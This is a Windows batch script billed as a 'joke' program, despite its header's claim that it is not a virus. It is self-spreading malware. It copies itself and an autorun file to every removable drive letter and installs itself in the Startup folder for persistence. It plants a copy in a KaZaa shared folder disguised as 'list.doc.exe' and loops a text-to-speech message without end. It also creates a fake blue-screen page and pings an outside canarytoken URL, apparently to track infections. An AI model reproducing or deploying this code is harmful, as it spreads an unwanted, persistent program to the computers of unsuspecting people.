@echo off
:: Win32:Joke.JoaoVitor - PatoFlamejanteTV
::
:: Small snippets of code by: Loveware Project, By MalDev101
:: https://github.com/MalDev101/Loveware/blob/master/Loveware/Loveware.bat
::
:: THIS IS NOT AN VIRUS, THIS JUST COPIES AN FUNNY MESSAGE TO USB, THIS NOT AN TROJAN!!!!!!!!!!!!!!!!
:: -----------------------------------------------------------------------

:: Check if is already infected, if yes, delete every 1.bat and windowsinf

cd /d d:
IF EXIST windows.inf DEL windows.inf
cd /d e:
IF EXIST windows.inf DEL windows.inf
cd /d f:
IF EXIST windows.inf DEL windows.inf
cd /d g:
IF EXIST windows.inf DEL windows.inf
cd /d h:
IF EXIST windows.inf DEL windows.inf
cd /d i:
IF EXIST windows.inf DEL windows.inf
cd /d j:
IF EXIST windows.inf DEL windows.inf
cd /d k:
IF EXIST windows.inf DEL windows.inf
cd /d l:
IF EXIST windows.inf DEL windows.inf
cd /d m:
IF EXIST windows.inf DEL windows.inf
cd /d c:

:: Create autorun file

echo [autorun] > windows.inf
echo ;open=1.bat >> windows.inf
echo ShellExecute=1.bat >> windows.inf
echo UseAutoPlay=1 >> windows.inf

:: Copy windows.inf to usb
xcopy /e /y windows.inf D:\
xcopy /e /y windows.inf E:\
xcopy /e /y windows.inf F:\
xcopy /e /y windows.inf G:\
xcopy /e /y windows.inf H:\
xcopy /e /y windows.inf I:\
xcopy /e /y windows.inf J:\
xcopy /e /y windows.inf K:\
xcopy /e /y windows.inf L:\
xcopy /e /y windows.inf M:\

:: Copy main.bat to usb drives

xcopy /e /y 1.bat D:\
xcopy /e /y 1.bat E:\
xcopy /e /y 1.bat F:\
xcopy /e /y 1.bat G:\
xcopy /e /y 1.bat H:\
xcopy /e /y 1.bat I:\
xcopy /e /y 1.bat J:\
xcopy /e /y 1.bat K:\
xcopy /e /y 1.bat L:\
xcopy /e /y 1.bat M:\

XCOPY "%cd%\1.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" :: Ciclo do capeta

:: Use KaZaa to spread if the user has this ancient stuff

if exist C:\Program Files\KaZaa\My Shared Folder\ (
    xcopy 1.bat C:\Program Files\KaZaa\My Shared Folder\list.doc.exe
)

:: -------------------------------------------------------------------------
IF EXIST speak.vbs DEL speak.vbs
echo do > speak.vbs
echo CreateObject("SAPI.SpVoice").Speak"Eu estarei aqui..." >> speak.vbs
echo loop >> speak.vbs

:: -------------------------------------------------------------------------
:: https://github.com/DualsFWShield/CMD-Batch-script/blob/main/bsod.bat

IF EXIST bsod.htas DEL bsod.hta
IF EXIST bsod.cmd DEL bsod.cmd

echo ^<html^>^<head^>^<title^>BSOD^</title^> > bsod.hta
echo. >> bsod.hta
echo ^<hta:application >> bsod.hta
echo applicationname="BSOD"  >> bsod.hta
echo version="1.0" >> bsod.hta
echo maximizebutton="no" >> bsod.hta
echo minimizebutton="no" >> bsod.hta
echo sysmenu="no" >> bsod.hta
echo Caption="no" >> bsod.hta
echo windowstate="maximize"/^> >> bsod.hta
echo. >> bsod.hta
echo ^</head^>^<body bgcolor="#000088" scroll="no"^> >> bsod.hta
echo ^<font face="Lucida Console" size="4" color="#FFFFFF"^> >> bsod.hta
echo ^<p^>Un praublaime a aitez deteqtez sur vautre aurdinateur^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>CHALEUR_HERROR^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Si ses la preumiere fois que vou recevez cet ereur suivez les aitapes ci-dessous :^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>1. Vairifier que l'ordinateur sois impermaiable et vairifiez la tanpaiatur extairieur.^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>2. Placer une bouteille d'au devant l'aurdinateur et ouvrir les feunaitre.^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>3. Placer des serviaites humide su l'audrdi^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Information teqnike :^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^> >> bsod.hta
echo. >> bsod.hta
echo. >> bsod.hta
echo ^<p^>***       gv3.sys - CPU a 50^°C..., UCU a 68^°C^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Ouch je meur de chau^</p^> >> bsod.hta
echo ^<p^>Donne de l'au stp...^</p^> >> bsod.hta
echo ^<p^>Si le praublaime y persist contact ton administrateur reso frer !^</p^> >> bsod.hta
echo. >> bsod.hta
echo. >> bsod.hta
echo ^</font^> >> bsod.hta
echo ^</body^>^</html^> >> bsod.hta

::echo start "" /wait "bsod.hta" >> bsod.cmd
:: funny map thing
curl http://canarytokens.com/stuff/traffic/about/dur578etwo3mh16nebmzgmx6j/index.html
